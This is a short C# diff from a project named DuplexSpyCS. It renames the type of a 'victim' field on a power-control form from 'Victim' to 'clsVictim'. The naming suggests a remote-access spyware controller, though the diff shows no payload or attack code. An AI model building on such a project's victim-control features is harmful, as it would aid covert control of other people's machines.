@@ -12,7 +12,7 @@ namespace DuplexSpyCS
 {
     public partial class frmPower : Form
     {
-        public Victim v;
+        public clsVictim v;
 
         public frmPower()
         {
